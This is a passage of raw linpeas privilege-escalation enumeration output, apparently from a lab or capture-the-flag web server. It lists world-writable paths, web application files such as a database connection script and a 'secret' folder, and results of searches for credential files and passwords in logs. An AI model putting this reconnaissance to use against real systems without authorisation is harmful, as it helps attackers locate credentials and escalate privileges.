-rw-r--r-- 1 root root 0 Jun 27  2021 /etc/.java/.systemPrefs/.systemRootModFile
-rw-r--r-- 1 root root 0 Jun 27  2021 /etc/.java/.systemPrefs/.system.lock
-rw------- 1 root root 0 Aug  6  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 1531 Jun 26  2021 /etc/apparmor.d/cache/.features

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 3529 Jun 26  2021 /var/backups/apt.extended_states.4.gz                                                                                     
-rw-r--r-- 1 root root 4247 Sep 30  2021 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 4227 Sep 12  2021 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 4201 Jun 27  2021 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 39711 Oct  4 15:49 /var/backups/apt.extended_states.0

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                       
/dev/mqueue                                                                                                                                                        
/dev/shm
/run/lock
/run/lock/apache2
/run/screen
/tmp
/tmp/tmux-33
/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/minecraft.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-lvm2x2dpvscan.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp
/var/www/admin
/var/www/admin/assets
/var/www/admin/assets/login.css
/var/www/admin/assets/lowercase.ttf
/var/www/admin/assets/panel.css
/var/www/admin/assets/uppercase.ttf
/var/www/admin/dbConn.php
/var/www/admin/index.php
/var/www/admin/linpeas.sh
/var/www/admin/login.php
/var/www/admin/panel.php
/var/www/html
/var/www/html/index.php
/var/www/store
/var/www/store/assets
/var/www/store/assets/lowercase.ttf
/var/www/store/assets/styles.css
/var/www/store/assets/uppercase.ttf
/var/www/store/index.html
/var/www/store/search.php
/var/www/tld
/var/www/tld/assets
/var/www/tld/index.html
/var/www/tld/secret

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                       
                                                                                                                                                                   
╔══════════╣ Searching passwords in history files
                                                                                                                                                                   
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                          
/bin/systemd-tty-ask-password-agent
/etc/java-8-openjdk/management/jmxremote.password
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/management/jmxremote.password
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                   
╔══════════╣ Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:                                                                                                                   
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2021-06-26 10:16:02,270 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 25 bytes
2021-06-26 10:16:02,271 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
2021-06-26 10:16:02,326 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
2021-06-26 10:16:02,327 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2021-06-26 10:50:34,430 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-26 10:50:34,430 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-26 14:23:39,220 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-26 14:23:39,220 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-26 16:34:18,784 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-26 16:34:18,784 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-26 17:26:41,243 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-26 17:26:41,243 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 08:13:02,795 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 08:13:02,795 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 09:15:04,874 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 09:15:04,874 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 13:25:09,261 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 13:25:09,261 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 14:46:44,157 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 14:46:44,157 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 15:11:52,659 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 15:11:52,659 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 15:18:13,144 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 15:18:13,144 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 16:47:11,668 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 16:47:11,668 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 17:14:01,080 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 17:14:01,081 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 17:49:33,899 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 17:49:33,899 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-27 17:55:01,055 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-27 17:55:01,055 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-28 09:51:49,259 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-28 09:51:49,259 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-06-28 18:45:23,025 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-06-28 18:45:23,025 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 09:29:28,022 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 09:29:28,022 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 11:48:56,333 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 11:48:56,333 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 11:53:50,604 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 11:53:50,604 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 12:01:30,550 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 12:01:30,550 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-12 12:07:43,416 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-12 12:07:43,416 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 13:08:30,175 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 13:08:30,175 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 13:43:30,354 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 13:43:30,355 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 14:34:44,684 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 14:34:44,684 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 15:21:27,141 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 15:21:27,141 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-09-30 15:26:29,979 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-09-30 15:26:29,979 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-04 15:49:04,183 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-04 15:49:04,183 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-06 09:44:12,448 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-06 09:44:12,448 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-06 09:45:39,717 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-06 09:45:39,717 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-06 09:48:45,363 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-06 09:48:45,363 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-15 17:13:34,113 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-15 17:13:34,113 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-10-15 20:36:15,487 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-10-15 20:36:15,487 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
